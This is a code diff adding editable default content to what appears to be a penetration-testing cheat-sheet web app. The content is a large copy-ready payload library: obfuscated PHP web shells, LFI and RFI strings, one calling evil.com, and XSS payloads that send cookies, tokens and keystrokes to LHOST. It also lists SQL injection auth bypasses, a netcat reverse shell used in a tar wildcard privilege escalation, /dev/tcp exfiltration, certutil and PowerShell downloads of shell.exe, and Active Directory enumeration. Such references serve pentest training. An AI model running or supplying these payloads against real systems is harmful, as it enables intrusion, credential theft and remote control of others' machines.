+            <div><div class="adm-ttl" style="font-size:13px;">union/enum</div><div class="ple-list" id="sqli-ple-union"></div><button class="add-btn" onclick="addCmdItemTab('sqli','union')">+ add</button></div>
+            <div><div class="adm-ttl" style="font-size:13px;">blind/time</div><div class="ple-list" id="sqli-ple-blind"></div><button class="add-btn" onclick="addCmdItemTab('sqli','blind')">+ add</button></div>
+            <div><div class="adm-ttl" style="font-size:13px;">auth bypass</div><div class="ple-list" id="sqli-ple-auth"></div><button class="add-btn" onclick="addCmdItemTab('sqli','auth')">+ add</button></div>
+            <div><div class="adm-ttl" style="font-size:13px;">order/group</div><div class="ple-list" id="sqli-ple-order"></div><button class="add-btn" onclick="addCmdItemTab('sqli','order')">+ add</button></div>
+          </div>
+          <br><button class="sv-btn" style="margin-top:10px;" onclick="saveCmdPageTabs('sqli')">save all sqli items</button>
+          <span class="sv-flash" id="sv-sqli-items">saved</span>
         </div>
         <!-- LINUX -->
         <div id="adm-linux" class="adm-s">
@@ -1239,6 +1308,17 @@ $Searcher.FindAll() | Foreach {
           <div class="ef"><label>page title</label><input type="text" id="adm-linux-title"></div>
           <div class="ef"><label>description</label><textarea id="adm-linux-desc" rows="2"></textarea></div>
           <button class="sv-btn" onclick="savePageMeta('linux','adm-linux')">save</button><span class="sv-flash" id="sv-adm-linux">saved</span>
+          <hr style="border-color:var(--border);margin:1.5rem 0;">
+          <div style="display:grid;grid-template-columns:1fr 1fr;gap:1.5rem;">
+            <div><div class="adm-ttl" style="font-size:13px;">suid/caps</div><div class="ple-list" id="linux-ple-suid"></div><button class="add-btn" onclick="addCmdItemTab('linux','suid')">+ add</button></div>
+            <div><div class="adm-ttl" style="font-size:13px;">sysinfo</div><div class="ple-list" id="linux-ple-sysinfo"></div><button class="add-btn" onclick="addCmdItemTab('linux','sysinfo')">+ add</button></div>
+            <div><div class="adm-ttl" style="font-size:13px;">cron</div><div class="ple-list" id="linux-ple-cron"></div><button class="add-btn" onclick="addCmdItemTab('linux','cron')">+ add</button></div>
+            <div><div class="adm-ttl" style="font-size:13px;">network</div><div class="ple-list" id="linux-ple-net"></div><button class="add-btn" onclick="addCmdItemTab('linux','net')">+ add</button></div>
+            <div><div class="adm-ttl" style="font-size:13px;">port forward</div><div class="ple-list" id="linux-ple-portfwd"></div><button class="add-btn" onclick="addCmdItemTab('linux','portfwd')">+ add</button></div>
+            <div><div class="adm-ttl" style="font-size:13px;">file transfer</div><div class="ple-list" id="linux-ple-filetransfer"></div><button class="add-btn" onclick="addCmdItemTab('linux','filetransfer')">+ add</button></div>
+          </div>
+          <br><button class="sv-btn" style="margin-top:10px;" onclick="saveCmdPageTabs('linux')">save all linux items</button>
+          <span class="sv-flash" id="sv-linux-items">saved</span>
         </div>
         <!-- WINDOWS -->
         <div id="adm-windows" class="adm-s">
@@ -1246,6 +1326,14 @@ $Searcher.FindAll() | Foreach {
           <div class="ef"><label>page title</label><input type="text" id="adm-windows-title"></div>
           <div class="ef"><label>description</label><textarea id="adm-windows-desc" rows="2"></textarea></div>
           <button class="sv-btn" onclick="savePageMeta('windows','adm-windows')">save</button><span class="sv-flash" id="sv-adm-windows">saved</span>
+          <hr style="border-color:var(--border);margin:1.5rem 0;">
+          <div style="display:grid;grid-template-columns:1fr 1fr;gap:1.5rem;">
+            <div><div class="adm-ttl" style="font-size:13px;">sysinfo</div><div class="ple-list" id="windows-ple-sysinfo"></div><button class="add-btn" onclick="addCmdItemTab('windows','sysinfo')">+ add</button></div>
+            <div><div class="adm-ttl" style="font-size:13px;">http/download</div><div class="ple-list" id="windows-ple-http"></div><button class="add-btn" onclick="addCmdItemTab('windows','http')">+ add</button></div>
+            <div><div class="adm-ttl" style="font-size:13px;">active directory</div><div class="ple-list" id="windows-ple-ad"></div><button class="add-btn" onclick="addCmdItemTab('windows','ad')">+ add</button></div>
+          </div>
+          <br><button class="sv-btn" style="margin-top:10px;" onclick="saveCmdPageTabs('windows')">save all windows items</button>
+          <span class="sv-flash" id="sv-windows-items">saved</span>
         </div>
         <!-- ENCODING -->
         <div id="adm-encoding" class="adm-s">
@@ -1267,6 +1355,12 @@ $Searcher.FindAll() | Foreach {
           <div class="ef"><label>page title</label><input type="text" id="adm-tty-title"></div>
           <div class="ef"><label>description</label><textarea id="adm-tty-desc" rows="2"></textarea></div>
           <button class="sv-btn" onclick="savePageMeta('tty','adm-tty')">save</button><span class="sv-flash" id="sv-adm-tty">saved</span>
+          <hr style="border-color:var(--border);margin:1.5rem 0;">
+          <div class="adm-ttl" style="font-size:13px;">quick spawn methods</div>
+          <div class="ple-list" id="tty-ple-list"></div>
+          <button class="add-btn" onclick="addCmdItem('tty')">+ add entry</button>
+          <br><button class="sv-btn" style="margin-top:10px;" onclick="saveCmdPage('tty')">save all</button>
+          <span class="sv-flash" id="sv-tty-items">saved</span>
         </div>
         <!-- NAV ICONS -->
         <div id="adm-nav-icons" class="adm-s">
@@ -1344,8 +1438,9 @@ window.addEventListener('DOMContentLoaded',()=>{
   genShell();
   genMsf();
   genPhpShell();
-  buildLfiLists();
   loadContent();
+  initAllCmdPages();
+  jbAutoSync();
 });
 
 // ─── HOME GRID ───
@@ -1545,18 +1640,6 @@ function printit($string) { if (!$daemon) { print "$string\\n"; } }
 ?>`;
 }
 
-// ─── LFI LISTS ───
-function buildLfiLists(){
-  const linux=['/etc/passwd','/etc/shadow','/etc/issue','/etc/group','/etc/hostname','/etc/ssh/ssh_config','/etc/ssh/sshd_config','/root/.ssh/id_rsa','/root/.ssh/authorized_keys','/home/user/.ssh/authorized_keys','/proc/mounts','/proc/self/environ','/home/$USER/.bash_history','/var/run/secrets/kubernetes.io/serviceaccount','/var/lib/mlocate/mlocate.db'];
-  const win=['/boot.ini','/autoexec.bat','/windows/system32/drivers/etc/hosts','/windows/repair/SAM','/windows/panther/unattended.xml','/windows/panther/unattend/unattended.xml','/windows/system32/license.rtf','/windows/system32/eula.txt'];
-  const apache=['/etc/apache2/apache2.conf','/usr/local/etc/apache2/httpd.conf','/etc/httpd/conf/httpd.conf','/var/log/apache2/access.log','/var/log/apache/error.log','/var/lib/mysql/mysql/user.frm','/var/lib/mysql/mysql/user.MYD','/var/lib/mysql/mysql/user.MYI'];
-  const ll=document.getElementById('lfi-linux-list');
-  const wl=document.getElementById('lfi-win-list');
-  const al=document.getElementById('lfi-apache-list');
-  if(ll) ll.innerHTML=linux.map(f=>`<div class="cmd-item"><div class="cmd-val">${f}</div></div>`).join('');
-  if(wl) wl.innerHTML=win.map(f=>`<div class="cmd-item"><div class="cmd-val">${f}</div></div>`).join('');
-  if(al) al.innerHTML=apache.map(f=>`<div class="cmd-item"><div class="cmd-val">${f}</div></div>`).join('');
-}
 
 // ─── PAYLOADS ───
 const DEFAULT_PAYLOADS=[
@@ -1858,7 +1941,9 @@ function loadAdminData(){
     if(de&&d)de.value=d;else if(de&&pd)de.value=pd.textContent;
   });
   buildPayloadEditor();
+  buildAllCmdEditors();
   buildIconEditor();
+  loadJbCredentialsIntoAdminUI();
 }
 
 // payload editor
@@ -1943,8 +2028,1120 @@ function clearIcon(id){
   renderNavIcon(id);
   renderCardIcon(id);
 }
+
+// ─── CMD PAGE DATA ───────────────────────────────────────────────────
+const CMD_DEFAULTS = {
+  php: [
+    {lbl:'short GET', val:'<?=`$_GET[0]`?>'},
+    {lbl:'short POST', val:'<?=`$_POST[0]`?>'},
+    {lbl:'request var', val:'<?=`{$_REQUEST[\'_\']}`?>'},
+    {lbl:'full obfuscated (GET ?0=cmd)', val:'<?=$_="";$_="\'";$_=($_^chr(4*4*(5+5)-40)).($_^chr(47+ord(1==1))).($_^chr(ord(\'_\')+3)).($_^chr(((10*10)+(5*3))));$_=${$_}[\'_\'^\'o\'];echo`$_`?>'},
+    {lbl:'function/arg style (?_=system&__=id)', val:'<?php $_="{"; $_=($_^"<").($_^">;").($_^"/"); ?>' + '<?=$' + '{' + "'_'.$_}['_']($" + "{'_'.$_}['__']);?>"},
+  ],
+  tty: [
+    {lbl:'python2', val:'python -c \'import pty; pty.spawn("/bin/bash")\''},
+    {lbl:'os.system', val:'echo os.system(\'/bin/bash\')'},
+    {lbl:'bash -i', val:'/bin/sh -i'},
+    {lbl:'perl', val:'perl -e \'exec "/bin/sh";\''},
+    {lbl:'ruby', val:'ruby: exec "/bin/sh"'},
+    {lbl:'lua', val:'lua: os.execute("/bin/sh")'},
+    {lbl:'vi escape', val:':!bash  (or :set shell=/bin/bash:shell)'},
+    {lbl:'nmap', val:'!sh'},
+    {lbl:'socat (full TTY)', val:'socat file:`tty`,raw,echo=0 tcp-listen:4444'},
+    {lbl:'socat target side', val:'socat exec:\'bash -li\',pty,stderr,setsid,sigint,sane tcp:LHOST:4444'},
+  ],
+};
+const CMD_TAB_DEFAULTS = {
+  "lfi": {
+    "basic": [
+      {
+        "lbl": "classic traversal",
+        "val": "../../../../../../../../etc/passwd"
+      },
+      {
+        "lbl": "null byte bypass (PHP <5.3)",
+        "val": "../../../../etc/passwd%00"
+      },
+      {
+        "lbl": "double encoding",
+        "val": "..%252f..%252f..%252fetc%252fpasswd"
+      },
+      {
+        "lbl": "unicode / overlong UTF-8",
+        "val": "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd"
+      },
+      {
+        "lbl": "path truncation (PHP <5.3)",
+        "val": "../../../../etc/passwd.........."
+      },
+      {
+        "lbl": "proc/self/environ RCE inject",
+        "val": "../../proc/self/environ"
+      }
+    ],
+    "wrappers": [
+      {
+        "lbl": "base64 encode file",
+        "val": "?page=php://filter/convert.base64-encode/resource=../../../../../etc/passwd"
+      },
+      {
+        "lbl": "expect RCE",
+        "val": "?page=expect://ls"
+      },
+      {
+        "lbl": "remote file (RFI)",
+        "val": "?page=http://evil.com/shell.txt"
+      },
+      {
+        "lbl": "input stream RCE (POST body = php)",
+        "val": "?page=php://input"
+      },
+      {
+        "lbl": "data URI RCE",
+        "val": "?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4="
+      }
+    ],
+    "linux": [
+      {
+        "lbl": "",
+        "val": "/etc/passwd"
+      },
+      {
+        "lbl": "",
+        "val": "/etc/shadow"
+      },
+      {
+        "lbl": "",
+        "val": "/etc/issue"
+      },
+      {
+        "lbl": "",
+        "val": "/etc/group"
+      },
+      {
+        "lbl": "",
+        "val": "/etc/hostname"
+      },
+      {
+        "lbl": "",
+        "val": "/etc/ssh/ssh_config"
+      },
+      {
+        "lbl": "",
+        "val": "/etc/ssh/sshd_config"
+      },
+      {
+        "lbl": "",
+        "val": "/root/.ssh/id_rsa"
+      },
+      {
+        "lbl": "",
+        "val": "/root/.ssh/authorized_keys"
+      },
+      {
+        "lbl": "",
+        "val": "/home/user/.ssh/authorized_keys"
+      },
+      {
+        "lbl": "",
+        "val": "/proc/mounts"
+      },
+      {
+        "lbl": "",
+        "val": "/proc/self/environ"
+      },
+      {
+        "lbl": "",
+        "val": "/home/$USER/.bash_history"
+      },
+      {
+        "lbl": "",
+        "val": "/var/run/secrets/kubernetes.io/serviceaccount"
+      },
+      {
+        "lbl": "",
+        "val": "/var/lib/mlocate/mlocate.db"
+      }
+    ],
+    "windows": [
+      {
+        "lbl": "",
+        "val": "/boot.ini"
+      },
+      {
+        "lbl": "",
+        "val": "/autoexec.bat"
+      },
+      {
+        "lbl": "",
+        "val": "/windows/system32/drivers/etc/hosts"
+      },
+      {
+        "lbl": "",
+        "val": "/windows/repair/SAM"
+      },
+      {
+        "lbl": "",
+        "val": "/windows/panther/unattended.xml"
+      },
+      {
+        "lbl": "",
+        "val": "/windows/panther/unattend/unattended.xml"
+      },
+      {
+        "lbl": "",
+        "val": "/windows/system32/license.rtf"
+      },
+      {
+        "lbl": "",
+        "val": "/windows/system32/eula.txt"
+      }
+    ],
+    "apache": [
+      {
+        "lbl": "",
+        "val": "/etc/apache2/apache2.conf"
+      },
+      {
+        "lbl": "",
+        "val": "/usr/local/etc/apache2/httpd.conf"
+      },
+      {
+        "lbl": "",
+        "val": "/etc/httpd/conf/httpd.conf"
+      },
+      {
+        "lbl": "",
+        "val": "/var/log/apache2/access.log"
+      },
+      {
+        "lbl": "",
+        "val": "/var/log/apache/error.log"
+      },
+      {
+        "lbl": "",
+        "val": "/var/lib/mysql/mysql/user.frm"
+      },
+      {
+        "lbl": "",
+        "val": "/var/lib/mysql/mysql/user.MYD"
+      },
+      {
+        "lbl": "",
+        "val": "/var/lib/mysql/mysql/user.MYI"
+      }
+    ]
+  },
+  "xss": {
+    "grab": [
+      {
+        "lbl": "cookie grab via redirect",
+        "val": "<script>document.location='http://LHOST/grab.php?c='+document.cookie<\\/script>"
+      },
+      {
+        "lbl": "localStorage access_token",
+        "val": "<script>document.location='http://LHOST/grab.php?c='+localStorage.getItem('access_token')<\\/script>"
+      },
+      {
+        "lbl": "image beacon (cookie)",
+        "val": "<script>new Image().src='http://LHOST/c.php?c='+document.cookie;<\\/script>"
+      },
+      {
+        "lbl": "fetch exfil (base64)",
+        "val": "<script>fetch('http://LHOST/?c='+btoa(document.cookie))<\\/script>"
+      },
+      {
+        "lbl": "keylogger skeleton",
+        "val": "<script>document.onkeypress=function(e){fetch('http://LHOST/?k='+e.key)}<\\/script>"
+      }
+    ],
+    "html": [
+      {
+        "lbl": "basic alert",
+        "val": "<script>alert(document.domain)<\\/script>"
+      },
+      {
+        "lbl": "script tag bypass",
+        "val": "<scr<script>ipt>alert('XSS')<\\/scr<script>ipt>"
+      },
+      {
+        "lbl": "attribute breakout",
+        "val": "\"><script>alert(1)<\\/script>"
+      },
+      {
+        "lbl": "img onerror",
+        "val": "<img src=x onerror=alert(1)>"
+      },
+      {
+        "lbl": "img onerror (fromCharCode)",
+        "val": "<img src=x onerror=alert(String.fromCharCode(88,83,83))>"
+      },
+      {
+        "lbl": "body onload",
+        "val": "<body onload=alert(1)>"
+      },
+      {
+        "lbl": "input autofocus onfocus",
+        "val": "<input autofocus onfocus=alert(1)>"
+      },
+      {
+        "lbl": "href javascript",
+        "val": "<a href=\"javascript:alert(1)\">click</a>"
+      }
+    ],
+    "md": [
+      {
+        "lbl": "markdown link (javascript:)",
+        "val": "[clickme](javascript:prompt(document.cookie))"
+      },
+      {
+        "lbl": "space obfuscation",
+        "val": "[a](j a v a s c r i p t:prompt(document.cookie))"
+      },
+      {
+        "lbl": "data URI base64",
+        "val": "[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)"
+      },
+      {
+        "lbl": "window.onerror",
+        "val": "[a](javascript:window.onerror=alert;throw%201)"
+      }
+    ],
+    "svg": [
+      {
+        "lbl": "svg onload",
+        "val": "<svg xmlns='http://www.w3.org/2000/svg' onload='alert(document.domain)'/>"
+      },
+      {
+        "lbl": "svg desc CDATA",
+        "val": "<svg><desc><![CDATA[<\\/desc><script>alert(1)<\\/script>]]><\\/svg>"
+      },
+      {
+        "lbl": "svg foreignObject CDATA",
+        "val": "<svg><foreignObject><![CDATA[<\\/foreignObject><script>alert(2)<\\/script>]]><\\/svg>"
+      },
+      {
+        "lbl": "svg title CDATA",
+        "val": "<svg><title><![CDATA[<\\/title><script>alert(3)<\\/script>]]><\\/svg>"
+      }
+    ],
+    "bypass": [
+      {
+        "lbl": "eval string concat",
+        "val": "eval('ale'+'rt(1)')"
+      },
+      {
+        "lbl": "Function constructor",
+        "val": "Function('ale'+'rt(1)')()"
+      },
+      {
+        "lbl": "setTimeout string",
+        "val": "setTimeout('ale'+'rt(2)')"
+      },
+      {
+        "lbl": "Set.constructor template",
+        "val": "Set.constructor`alert(1)```"
+      },
+      {
+        "lbl": "new Function template",
+        "val": "new Function`alert`6``"
+      },
+      {
+        "lbl": "JSFuck-style (alert)",
+        "val": "[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]"
+      }
+    ]
+  },
+  "sqli": {
+    "union": [
+      {
+        "lbl": "null probe (MySQL/MSSQL/PG)",
+        "val": "' UNION SELECT NULL,NULL,NULL-- -"
+      },
+      {
+        "lbl": "null probe (Oracle)",
+        "val": "' UNION SELECT NULL,NULL,NULL FROM DUAL-- -"
+      },
+      {
+        "lbl": "column count (ORDER BY)",
+        "val": "' ORDER BY 1-- -"
+      },
+      {
+        "lbl": "version (MySQL/MSSQL)",
+        "val": "' UNION SELECT @@version-- -"
+      },
+      {
+        "lbl": "version (Oracle)",
+        "val": "' UNION SELECT banner FROM v$version-- -"
+      },
+      {
+        "lbl": "version (Postgres)",
+        "val": "' UNION SELECT version()-- -"
+      },
+      {
+        "lbl": "tables (MySQL/MSSQL/PG)",
+        "val": "' UNION SELECT table_name,NULL FROM INFORMATION_SCHEMA.TABLES-- -"
+      },
+      {
+        "lbl": "tables (Oracle)",
+        "val": "' UNION SELECT table_name,NULL FROM all_tables-- -"
+      },
+      {
+        "lbl": "columns (MySQL/MSSQL/PG)",
+        "val": "' UNION SELECT column_name,NULL FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='X'-- -"
+      },
+      {
+        "lbl": "concat values (MySQL/PG)",
+        "val": "' UNION SELECT concat(col1,':',col2) FROM tablename LIMIT 1-- -"
+      },
+      {
+        "lbl": "concat values (Oracle/PG)",
+        "val": "' UNION SELECT col1||':'||col2,NULL FROM tablename-- -"
+      },
+      {
+        "lbl": "concat values (MSSQL)",
+        "val": "' UNION SELECT col1+':'+col2,NULL FROM tablename-- -"
+      }
+    ],
+    "blind": [
+      {
+        "lbl": "time-based (MySQL)",
+        "val": ",(SELECT * FROM (SELECT(SLEEP(5)))a)"
+      },
+      {
+        "lbl": "time-based (MSSQL)",
+        "val": "'; WAITFOR DELAY '0:0:5'--"
+      },
+      {
+        "lbl": "conditional error (MySQL)",
+        "val": "' UNION SELECT IF(1=1,(SELECT table_name FROM information_schema.tables),'a')-- -"
+      },
+      {
+        "lbl": "conditional error (Postgres)",
+        "val": "' UNION SELECT CASE WHEN (1=1) THEN cast(1/0 as text) ELSE NULL END-- -"
+      },
+      {
+        "lbl": "conditional error (Oracle)",
+        "val": "' UNION SELECT CASE WHEN (1=1) THEN to_char(1/0) ELSE NULL END FROM dual-- -"
+      },
+      {
+        "lbl": "conditional error (MSSQL)",
+        "val": "' UNION SELECT CASE WHEN (1=1) THEN 1/0 ELSE NULL END-- -"
+      },
+      {
+        "lbl": "error-based extractvalue (MySQL)",
+        "val": "' AND extractvalue(1,concat(0x7e,(SELECT version())))--"
+      }
+    ],
+    "auth": [
+      {
+        "lbl": "or true",
+        "val": "or true--"
+      },
+      {
+        "lbl": "double-quote close",
+        "val": "\") or true--"
+      },
+      {
+        "lbl": "single-quote close",
+        "val": "') or true--"
+      },
+      {
+        "lbl": "admin bypass (--)",
+        "val": "admin') or ('1'='1'--"
+      },
+      {
+        "lbl": "admin bypass (#)",
+        "val": "admin') or ('1'='1'#"
+      },
+      {
+        "lbl": "1=1 always true",
+        "val": "' OR '1'='1"
+      },
+      {
+        "lbl": "version check probe",
+        "val": "' AND MID(VERSION(),1,1) = '5';"
+      }
+    ],
+    "order": [
+      {
+        "lbl": "ORDER BY column count 1",
+        "val": "1' ORDER BY 1--+"
+      },
+      {
+        "lbl": "ORDER BY column count 2",
+        "val": "1' ORDER BY 2--+"
+      },
+      {
+        "lbl": "ORDER BY column count 3",
+        "val": "1' ORDER BY 3--+"
+      },
+      {
+        "lbl": "GROUP BY 1,2,3",
+        "val": "1' GROUP BY 1,2,3--+"
+      },
+      {
+        "lbl": "GROUP BY having",
+        "val": "' GROUP BY columnnames having 1=1--"
+      },
+      {
+        "lbl": "UNION 3 cols",
+        "val": "-1' UNION SELECT 1,2,3--+"
+      },
+      {
+        "lbl": "INTO @ probe (MSSQL)",
+        "val": "-1 UNION SELECT 1 INTO @,@,@"
+      },
+      {
+        "lbl": "sysobjects enum (MSSQL)",
+        "val": "' and 1 in (select min(name) from sysobjects where xtype='U' and name > '.')--"
+      }
+    ]
+  },
+  "linux": {
+    "suid": [
+      {
+        "lbl": "find SUID root files",
+        "val": "find / -user root -perm /4000 2>/dev/null"
+      },
+      {
+        "lbl": "find SUID (alt)",
+        "val": "find / -perm -u=s -type f 2>/dev/null"
+      },
+      {
+        "lbl": "find SUID list",
+        "val": "find / -user root -perm -4000 -exec ls -ldb {} \\; > /tmp/suid"
+      },
+      {
+        "lbl": "capabilities",
+        "val": "getcap -r / 2>/dev/null"
+      },
+      {
+        "lbl": "world-writable files",
+        "val": "find / -perm -o+w -type f 2>/dev/null | grep -v proc"
+      },
+      {
+        "lbl": "find txt files",
+        "val": "find / -type f -name '*.txt' 2>/dev/null"
+      },
+      {
+        "lbl": "TAR wildcard privesc step 1",
+        "val": "echo \"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc LHOST 1234 >/tmp/f\" > shell.sh"
+      },
+      {
+        "lbl": "TAR wildcard privesc step 2",
+        "val": "touch \"/var/www/html/--checkpoint-action=exec=sh shell.sh\""
+      },
+      {
+        "lbl": "TAR wildcard privesc step 3",
+        "val": "touch \"/var/www/html/--checkpoint=1\""
+      }
+    ],
+    "sysinfo": [
+      {
+        "lbl": "OS release",
+        "val": "cat /etc/issue; cat /etc/*-release"
+      },
+      {
+        "lbl": "kernel version",
+        "val": "uname -a; cat /proc/version"
+      },
+      {
+        "lbl": "env variables",
+        "val": "cat /etc/profile; cat ~/.bashrc; env"
+      },
+      {
+        "lbl": "service configs",
+        "val": "cat /etc/apache2/apache2.conf; cat /etc/my.conf"
+      }
+    ],
+    "cron": [
+      {
+        "lbl": "list user crontab",
+        "val": "crontab -l"
+      },
+      {
+        "lbl": "list cron spool",
+        "val": "ls -alh /var/spool/cron"
+      },
+      {
+        "lbl": "all cron files",
+        "val": "ls -al /etc/cron*; cat /etc/crontab; cat /etc/anacrontab"
+      },
+      {
+        "lbl": "root crontab",
+        "val": "cat /var/spool/cron/crontabs/root"
+      },
+      {
+        "lbl": "at allow/deny",
+        "val": "cat /etc/at.allow; cat /etc/at.deny; cat /etc/cron.allow; cat /etc/cron.deny"
+      }
+    ],
+    "net": [
+      {
+        "lbl": "open connections",
+        "val": "lsof -i; netstat -antup; netstat -tulpn"
+      },
+      {
+        "lbl": "port 80 check",
+        "val": "lsof -i :80; grep 80 /etc/services"
+      },
+      {
+        "lbl": "login history",
+        "val": "last; lastlog"
+      },
+      {
+        "lbl": "running services",
+        "val": "chkconfig --list; chkconfig --list | grep 3:on"
+      }
+    ],
+    "portfwd": [
+      {
+        "lbl": "SSH local port forward",
+        "val": "ssh -L 8080:127.0.0.1:80 root@192.168.1.7"
+      },
+      {
+        "lbl": "SSH remote port forward",
+        "val": "ssh -R 8080:127.0.0.1:80 root@192.168.1.7"
+      },
+      {
+        "lbl": "nc port relay",
+        "val": "mknod backpipe p ; nc -l -p 8080 < backpipe | nc 10.1.1.251 80 >backpipe"
+      },
+      {
+        "lbl": "nc proxy (port 80->8080)",
+        "val": "mknod backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc localhost 80 | tee -a outflow 1>backpipe"
+      }
+    ],
+    "filetransfer": [
+      {
+        "lbl": "python3 HTTP server",
+        "val": "python3 -m http.server 8080"
+      },
+      {
+        "lbl": "python2 HTTP server",
+        "val": "python -m SimpleHTTPServer 8080"
+      },
+      {
+        "lbl": "bash TCP exfil (receiver)",
+        "val": "nc -l -p 54 > data"
+      },
+      {
+        "lbl": "bash TCP exfil (sender)",
+        "val": "bash -c 'cat file > /dev/tcp/LHOST/54'"
+      },
+      {
+        "lbl": "nc send file",
+        "val": "nc -lnvp 54 > file_saved"
+      },
+      {
+        "lbl": "nc receive file",
+        "val": "nc LHOST 54 < file_to_send"
+      },
+      {
+        "lbl": "SCP upload",
+        "val": "scp file user@192.168.1.1:~/dest -P 22"
+      },
+      {
+        "lbl": "SCP download",
+        "val": "scp user@192.168.1.1:~/file saved_file -P 22"
+      }
+    ]
+  },
+  "windows": {
+    "sysinfo": [
+      {
+        "lbl": "system info",
+        "val": "systeminfo; Get-WmiObject Win32_ComputerSystem"
+      },
+      {
+        "lbl": "hostname + domain",
+        "val": "echo \"$env:COMPUTERNAME.$env:USERDNSDOMAIN\""
+      },
+      {
+        "lbl": "security patches",
+        "val": "Get-Hotfix -description \"Security update\""
+      },
+      {
+        "lbl": "hotfix (wmic)",
+        "val": "wmic qfe get HotfixID,ServicePackInEffect,InstallDate,InstalledBy,InstalledOn"
+      },
+      {
+        "lbl": "env variables",
+        "val": "Get-ChildItem Env: | ft Key,Value"
+      },
+      {
+        "lbl": "WLAN profiles",
+        "val": "netsh wlan show profiles"
+      },
+      {
+        "lbl": "WLAN password",
+        "val": "netsh wlan show profile name=\"PROFILE-NAME\" key=clear"
+      }
+    ],
+    "http": [
+      {
+        "lbl": "wget equiv (PowerShell)",
+        "val": "Invoke-WebRequest \"http://10.10.10.10/shell.exe\" -OutFile \"shell.exe\""
+      },
+      {
+        "lbl": "certutil download",
+        "val": "certutil -urlcache -f http://10.10.10.10/shell.exe shell.exe"
+      },
+      {
+        "lbl": "bitsadmin download",
+        "val": "bitsadmin /transfer job /download /priority high http://10.10.10.10/file C:\\file"
+      },
+      {
+        "lbl": "PS Net.WebClient",
+        "val": "(New-Object Net.WebClient).DownloadFile('http://10.10.10.10/file','C:\\file')"
+      }
+    ],
+    "ad": [
+      {
+        "lbl": "PowerView URL",
+        "val": "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1"
+      },
+      {
+        "lbl": "domain enum",
+        "val": "Get-NetDomain; Get-NetForestDomain; Get-DomainSID"
+      },
+      {
+        "lbl": "domain policy",
+        "val": "Get-DomainPolicy"
+      },
+      {
+        "lbl": "OUs",
+        "val": "Get-NetOU"
+      },
+      {
+        "lbl": "domain trusts",
+        "val": "Get-NetDomainTrust"
+      },
+      {
+        "lbl": "GPO on computer",
+        "val": "Get-NetGPO -ComputerName computername.domain.com"
+      },
+      {
+        "lbl": "password last set",
+        "val": "Get-UserProperty -Properties pwdlastset"
+      },
+      {
+        "lbl": "description field (pass hunt)",
+        "val": "Find-UserField -SearchField Description -SearchTerm \"pass\""
+      },
+      {
+        "lbl": "list computers",
+        "val": "Get-NetComputer; Get-NetComputer -Ping"
+      },
+      {
+        "lbl": "OS filter",
+        "val": "Get-NetComputer -OperatingSystem \"Windows 7 Ultimate\""
+      },
+      {
+        "lbl": "domain admins",
+        "val": "Get-NetGroupMember -GroupName \"Domain Admins\""
+      },
+      {
+        "lbl": "admin groups",
+        "val": "Get-NetGroup *admin*"
+      },
+      {
+        "lbl": "user ACL",
+        "val": "Get-ObjectAcl -SamAccountName \"users\" -ResolveGUIDs"
+      },
+      {
+        "lbl": "password reset rights",
+        "val": "Get-ObjectAcl -SamAccountName labuser -ResolveGUIDs -RightsFilter \"ResetPassword\""
+      },
+      {
+        "lbl": "export users (ldifde)",
+        "val": "ldifde -d \"OU=THING,DC=CHANGE,DC=ME\" -p subtree -f dump.ldf"
+      },
+      {
+        "lbl": "export users (csvde)",
+        "val": "csvde -d \"OU=THING,DC=CHANGE,DC=ME\" -p subtree -f dump.csv"
+      }
+    ]
+  }
+};
+
+// Live cmd page data (loaded from localStorage or defaults)
+let CMD_DATA = {};
+let CMD_TAB_DATA = {};
+
+function loadCmdData(){
+  // flat pages
+  ['php','tty'].forEach(p=>{
+    const stored=localStorage.getItem('nufyl_cmd_'+p);
+    CMD_DATA[p]=stored?JSON.parse(stored):[...CMD_DEFAULTS[p]];
+  });
+  // tabbed pages
+  ['lfi','xss','sqli','linux','windows'].forEach(p=>{
+    const stored=localStorage.getItem('nufyl_cmdtab_'+p);
+    if(stored){CMD_TAB_DATA[p]=JSON.parse(stored);}
+    else{
+      CMD_TAB_DATA[p]={};
+      Object.keys(CMD_TAB_DEFAULTS[p]).forEach(tab=>{
+        CMD_TAB_DATA[p][tab]=[...CMD_TAB_DEFAULTS[p][tab]];
+      });
+    }
+  });
+}
+
+function renderCmdList(containerEl, items, search=''){
+  if(!containerEl) return;
+  const q=search.toLowerCase();
+  const filtered=items.filter(it=>!q||(it.lbl+it.val).toLowerCase().includes(q));
+  if(!filtered.length){containerEl.innerHTML='<div class="sr-none">no results</div>';return;}
+  containerEl.innerHTML=filtered.map(it=>`
+    <div class="cmd-item" style="display:grid;grid-template-columns:1fr auto;gap:8px;align-items:start;">
+      <div>
+        ${it.lbl?`<div class="cmd-lbl">${escHtml(it.lbl)}</div>`:''}
+        <div class="cmd-val">${escHtml(it.val)}</div>
+      </div>
+      <button class="btn" style="padding:3px 9px;font-size:10px;flex-shrink:0;margin-top:${it.lbl?'14px':'0'};" onclick="copyText(${JSON.stringify(it.val)},this)">copy</button>
+    </div>`).join('');
+}
+
+// Render all containers for a flat page
+function renderCmdPage(page){
+  const search=(document.getElementById(page+'-search')?.value||'').toLowerCase();
+  if(page==='php'){
+    renderCmdList(document.getElementById('php-cmd-list'),CMD_DATA.php,search);
+  } else if(page==='tty'){
+    renderCmdList(document.getElementById('tty-cmd-list'),CMD_DATA.tty,search);
+  } else if(CMD_TAB_DATA[page]){
+    // render all tabs filtered by search
+    Object.keys(CMD_TAB_DATA[page]).forEach(tab=>{
+      const el=document.getElementById(page+'-cmd-'+tab);
+      if(el) renderCmdList(el,CMD_TAB_DATA[page][tab],search);
+    });
+    // also update lfi special containers
+    if(page==='lfi'){
+      const el2=document.getElementById('lfi-linux-list');
+      if(el2) renderCmdList(el2,CMD_TAB_DATA.lfi.linux,search);
+      const el3=document.getElementById('lfi-win-list');
+      if(el3) renderCmdList(el3,CMD_TAB_DATA.lfi.windows,search);
+      const el4=document.getElementById('lfi-apache-list');
+      if(el4) renderCmdList(el4,CMD_TAB_DATA.lfi.apache,search);
+    }
